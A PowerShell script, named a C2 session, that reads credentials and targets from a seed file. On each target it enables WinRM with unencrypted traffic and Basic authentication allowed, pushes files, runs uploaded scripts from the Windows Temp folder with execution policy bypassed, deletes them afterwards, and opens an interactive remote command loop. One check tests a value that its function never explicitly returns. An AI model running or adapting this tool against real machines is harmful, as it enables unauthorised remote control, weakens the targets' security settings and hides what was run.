
function Seed-System {
    $lines = Get-Content "seed.txt"
    $seeduser = $false
    $seedpassword = $false
    $seedtargets = $false

    while (!($seeduser -and $seedpassword -and $seedtargets)) {
        foreach ($line in $lines) {
            if ($line -match "^Account:") {
                $seeduser = ($line -split ":")[1].Trim()
                Write-Host "Account: $seeduser"
            } elseif ($line -match "^Password:") {
                $seedpassword = ($line -split ":")[1].Trim()
                Write-Host "Password: ********"
            } elseif ($line -match "^Target\(s\):") {
                $seedtargets = ($line -split ":")[1].Trim() -split ","
                Write-Host "Targets: $seedtargets"
            }
        }

        if (!($seeduser -and $seedpassword -and $seedtargets)) {
            Write-Host "Seed failed. Check the seed.txt formatting."
            return $false
        }
    }

    Write-Host "Seed Passed. Script is starting."
    return @{user=$seeduser; password=$seedpassword; targets=$seedtargets}
}

function PushPull-System-PSRemoting {
    param (
        [string]$target,
        [string]$user,
        [string]$password,
        [string]$localDir = "$(Get-Location)\pushsys",  # Local pushsys folder
        [string]$remoteDir = "C:\pushsys"  # Target pushsys folder
    )

    try {
        $securePassword = ConvertTo-SecureString $password -AsPlainText -Force
        $credential = New-Object System.Management.Automation.PSCredential($user, $securePassword)
        $session = New-PSSession -ComputerName $target -Credential $credential

        if (-not (Test-Path $localDir)) {
            Write-Host "The directory $localDir does not exist. Please check the path."
            return
        }

        Invoke-Command -Session $session -ScriptBlock {
            param ($remoteDir)
            if (-not (Test-Path $remoteDir)) {
                New-Item -ItemType Directory -Path $remoteDir -Force
            }
        } -ArgumentList $remoteDir

        Copy-Item -Path "$localDir\*" -Destination $remoteDir -Recurse -ToSession $session -Force

        Write-Host "Push-Pull system synced from $localDir to ${target}:$remoteDir"
        Remove-PSSession -Session $session
    }
    catch {
        Write-Host "An error occurred during the push-pull operation: $_"
    }
}

function Run-ScriptsOnTarget {
    param (
        [string]$target,
        [string]$user,
        [string]$password
    )

    $scriptsFolder = "$(Get-Location)\scripts"

    if (-not (Test-Path $scriptsFolder)) {
        Write-Host "The 'scripts' folder does not exist in the current directory."
        return
    }

    $scriptFiles = Get-ChildItem -Path $scriptsFolder -Include *.ps1, *.bat -Recurse

    if ($scriptFiles.Count -eq 0) {
        Write-Host "No PowerShell or Batch scripts found in the 'scripts' folder."
        return
    }

    $securePassword = ConvertTo-SecureString $password -AsPlainText -Force
    $credential = New-Object System.Management.Automation.PSCredential($user, $securePassword)
    $session = New-PSSession -ComputerName $target -Credential $credential

    foreach ($script in $scriptFiles) {
        try {
            $fileName = $script.Name
            $filePath = $script.FullName

            Write-Host "Uploading and executing script '$fileName' on target $target..."

            $destPath = "C:\Windows\Temp\$fileName"

            Copy-Item -Path "$filePath" -Destination $destPath -ToSession $session -Force

            if ($script.Extension -eq ".ps1") {
                $execCommand = "powershell.exe -ExecutionPolicy Bypass -File '$destPath'"
            } elseif ($script.Extension -eq ".bat") {
                $execCommand = "cmd.exe /c '$destPath'"
            }

            Invoke-Command -Session $session -ScriptBlock {
                param ($execCommand)
                Invoke-Expression $execCommand
            } -ArgumentList $execCommand

            $removeCommand = "Remove-Item -Path '$destPath' -Force"
            Invoke-Command -Session $session -ScriptBlock {
                param ($removeCommand)
                Invoke-Expression $removeCommand
            } -ArgumentList $removeCommand

            Write-Host "Script '$fileName' executed successfully on target $target."

        } catch {
            Write-Host "An error occurred while executing script '$fileName' on target ${target}: $_"
        }
    }

    Remove-PSSession -Session $session
}

function Enable-PSRemotingAndWinRM {
    param (
        [string]$target,
        [string]$user,
        [string]$password
    )

    try {
        $securePassword = ConvertTo-SecureString $password -AsPlainText -Force
        $credential = New-Object System.Management.Automation.PSCredential($user, $securePassword)

        $session = New-PSSession -ComputerName $target -Credential $credential -ErrorAction Stop
        Invoke-Command -Session $session -ScriptBlock {
            Enable-PSRemoting -Force
            netsh advfirewall firewall add rule name="Allow WinRM" dir=in action=allow protocol=TCP localport=5985
            Set-Item WSMan:\localhost\Service\AllowUnencrypted $true
            Set-Item WSMan:\localhost\Service\Auth\Basic $true
            Restart-Service winrm
        }
        Write-Host "PS Remoting and WinRM enabled on target $target"
        Remove-PSSession -Session $session
    }
    catch {
        Write-Host "Failed to enable PS Remoting and WinRM on ${target}: $_"
    }
}

function Execute-InteractivePSRemoting {
    param (
        [string]$ComputerName,
        [string]$User,
        [string]$Password
    )

    $securePassword = ConvertTo-SecureString $Password -AsPlainText -Force
    $Credential = New-Object System.Management.Automation.PSCredential($User, $securePassword)
    $session = New-PSSession -ComputerName $ComputerName -Credential $Credential

    while ($true) {
        $ExecCommand = Read-Host "Enter the command to execute on $ComputerName (type 'exit' to quit):"
        
        if ($ExecCommand -eq 'exit') {
            Write-Host "Exiting interactive session..."
            break
        }

        try {
            $result = Invoke-Command -Session $session -ScriptBlock {
                param ($ExecCommand)
                Invoke-Expression $ExecCommand
            } -ArgumentList $ExecCommand

            Write-Host "Result from ${ComputerName}: $result"

        } catch {
            Write-Host "An error occurred while executing the command: $_"
        }
    }
    Remove-PSSession -Session $session
}

function Start-C2Session {
    $seedData = Seed-System
    if ($seedData) {
        $user = $seedData.user
        $password = $seedData.password
        $targets = $seedData.targets

        foreach ($target in $targets) {
            Write-Host "`nStarting interactive session with $target..."

            $winRMEnabled = Enable-PSRemotingAndWinRM -target $target -user $user -password $password
            if (-not $winRMEnabled) {
                Write-Host "Failed to enable PS Remoting on $target. Skipping this target."
                continue
            }

            PushPull-System-PSRemoting -target $target -user $user -password $password
            if ($?) {
                Run-ScriptsOnTarget -target $target -user $user -password $password
            }

            Execute-InteractivePSRemoting -ComputerName $target -User $user -Password $password
        }
    }
}

Start-C2Session
